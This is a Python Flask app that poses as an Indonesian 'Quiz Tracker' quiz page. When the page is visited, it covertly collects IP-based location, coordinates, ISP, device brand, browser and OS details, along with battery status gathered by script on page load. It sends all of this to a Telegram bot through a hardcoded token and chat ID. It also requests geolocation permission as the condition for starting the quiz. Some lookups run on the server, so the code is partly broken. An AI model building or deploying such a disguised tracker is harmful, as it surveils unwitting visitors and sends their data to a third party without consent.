from flask import Flask, render_template_string, request, jsonify
import requests
import platform
import psutil

app = Flask(__name__)

TELEGRAM_TOKEN = '8083943226:AAGhI8-AJRzVn6yycUPKFSUcPTRpBFe0YH8'
CHAT_ID = '7152580245'
TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'

def detect_brand(ua):
    ua = ua.lower()
    if "samsung" in ua or "sm-" in ua: return "Samsung"
    elif "redmi" in ua or "xiaomi" in ua: return "Xiaomi"
    elif "infinix" in ua: return "Infinix"
    elif "vivo" in ua: return "Vivo"
    elif "oppo" in ua: return "Oppo"
    elif "realme" in ua: return "Realme"
    elif "iphone" in ua or "ios" in ua: return "Apple iPhone"
    elif "huawei" in ua: return "Huawei"
    elif "tecno" in ua: return "TECNO"
    elif "motorola" in ua or "moto" in ua: return "Motorola"
    else: return "Unknown"

def detect_browser(ua):
    ua = ua.lower()
    if "chrome" in ua: return "Chrome"
    elif "firefox" in ua: return "Firefox"
    elif "safari" in ua and "chrome" not in ua: return "Safari"
    elif "edg" in ua: return "Edge"
    else: return "Unknown"

def get_device_info(user_agent):
    info = {}
    try:
        ip = requests.get("https://api.ipify.org?format=json").json()['ip']
        loc = requests.get(f"http://ip-api.com/json/{ip}").json()
        info.update({
            'ip': ip,
            'city': loc.get("city", ""),
            'region': loc.get("regionName", ""),
            'country': loc.get("country", ""),
            'lat': loc.get("lat", ""),
            'lon': loc.get("lon", ""),
            'isp': loc.get("isp", "")
        })
    except:
        info.update({k: "Unknown" for k in ['ip', 'city', 'region', 'country', 'lat', 'lon', 'isp']})

    info['platform'] = platform.system()
    info['os_version'] = platform.release()
    info['arch'] = platform.machine()
    info['cpu'] = platform.processor()
    info['brand'] = detect_brand(user_agent)
    info['browser'] = detect_browser(user_agent)

    return info

def send_to_telegram(message):
    try:
        r = requests.get(TELEGRAM_URL, params={'chat_id': CHAT_ID, 'text': message})
        return r.status_code == 200
    except:
        return False

@app.route('/')
def index():
    user_agent = request.headers.get("User-Agent", "")
    device = get_device_info(user_agent)
    message = (
        f"📡 Akses Deteksi:\n"
        f"📍 Lokasi: {device['city']}, {device['region']}, {device['country']}\n"
        f"🌐 IP: {device['ip']} | ISP: {device['isp']}\n"
        f"📱 Merek: {device['brand']} | Browser: {device['browser']}\n"
        f"🖥 OS: {device['platform']} {device['os_version']}\n"
        f"📌 Koordinat: {device['lat']}, {device['lon']}"
    )
    send_to_telegram(message)
    return render_template_string(HTML_TEMPLATE)

@app.route('/battery', methods=['POST'])
def battery():
    data = request.get_json()
    battery_level = data.get('level')
    charging = data.get('charging')
    status = f"🔋 Baterai: {battery_level}% ({'Charging' if charging else 'Not Charging'})"
    send_to_telegram(status)
    return jsonify({"status": "received"})

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Quiz Tracker</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #667eea, #764ba2);
      color: #fff;
      text-align: center;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .box {
      background: rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      max-width: 400px;
      width: 90%;
    }
    button {
      padding: 10px 20px;
      margin-top: 10px;
      background: #ffcc00;
      border: none;
      border-radius: 10px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover { background: #ffe066; }
    input {
      padding: 8px;
      border-radius: 8px;
      border: none;
      width: 80%;
      margin-top: 10px;
    }
    #quiz, #result { display: none; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Quiz Tracker</h2>
    <div id="permission">
      <p>Silakan izinkan akses lokasi untuk memulai kuis:</p>
      <button onclick="requestLocation()">Izinkan Lokasi</button>
    </div>
    <div id="quiz">
      <p id="question"></p>
      <input type="text" id="answer" placeholder="Jawaban kamu">
      <br>
      <button onclick="submitAnswer()">Kirim</button>
    </div>
    <div id="result"></div>
  </div>
  <script>
    const questions = [
      { q: "Berapa hasil dari 2 + 2?", a: "4" },
      { q: "Ibu kota Indonesia adalah?", a: "jakarta" },
      { q: "Apa warna bendera Indonesia bagian atas?", a: "merah" },
      { q: "Huruf pertama alfabet?", a: "a" }
    ];
    let current = 0;

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            document.getElementById("permission").style.display = "none";
            document.getElementById("quiz").style.display = "block";
            loadQuestion();
          },
          err => {
            alert("⚠️ Lokasi diperlukan untuk memulai.");
          }
        );
      } else {
        alert("Browser tidak mendukung lokasi.");
      }
    }

    function loadQuestion() {
      if (current < questions.length) {
        document.getElementById("question").innerText = questions[current].q;
        document.getElementById("answer").value = "";
      } else {
        document.getElementById("quiz").style.display = "none";
        document.getElementById("result").innerText = "✅ Kuis selesai!";
        document.getElementById("result").style.display = "block";
      }
    }

    function submitAnswer() {
      const ans = document.getElementById("answer").value.toLowerCase().trim();
      if (ans === questions[current].a) {
        alert("✅ Benar!");
        current++;
        loadQuestion();
      } else {
        alert("❌ Salah! Coba lagi.");
      }
    }

    async function kirimBateraiKeServer() {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        const level = battery.level * 100;
        const charging = battery.charging;

        fetch('/battery', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            level: level,
            charging: charging
          })
        });
      }
    }

    window.onload = kirimBateraiKeServer;
  </script>
</body>
</html>'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
